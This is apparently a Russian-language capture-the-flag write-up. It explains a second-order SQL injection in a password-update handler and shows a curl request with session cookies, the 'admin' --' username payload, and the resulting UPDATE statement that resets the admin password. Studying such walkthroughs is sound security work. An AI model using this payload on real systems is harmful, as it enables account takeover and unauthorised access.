```
curl 'http://94.19.79.169:20010/api/me' \
  -H 'Accept: */*' \
  -H 'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Connection: keep-alive' \
  -b 'JSESSIONID=9C88E1C81E207C2B3D497C671EF8E1D3; connect.sid=s%3AhW-mFtZj67Ghe88HcVaUc7L_oFkSMTI2.q39gAzbRkJE6Zfvr23Dl1FtkGHtJe5YZfRsv6W2aML0' \
  -H 'If-None-Match: W/"28-SlADADNU/VSDN/2R/k33emFvM/o"' \
  -H 'Referer: http://94.19.79.169:20010/settings' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36' \
  --insecure
  ```

```
{"username":"PG-123","isAdmin":false}
```


Уязвимость Second-Order SQL Injection в обработчике /update-password. 
Хотя регистрация и вход используют параметризованные запросы, имя пользователя из 
сессии подставляется в SQL-запрос обновления пароля через обычную шаблонную строку.

Это позволяет использовать «отравленный» логин для атаки на базу данных. 
Регистрируем аккаунт с пейлоадом в качестве имени пользователя:

`admin' --`

После входа под этим аккаунтом значение попадает в сессию. 
При смене пароля в настройках профиля сервер выполнит инъекцию: кавычка закроет 
поле `username`, а символы `--` закомментируют остаток оригинального запроса.

В результате SQL-запрос изменит пароль не нам, а администратору: 

```sql
UPDATE users SET password = '[hash]' WHERE username = 'admin' --'
```

Заходим под admin с новым паролем и забираем флаг в панели управления.
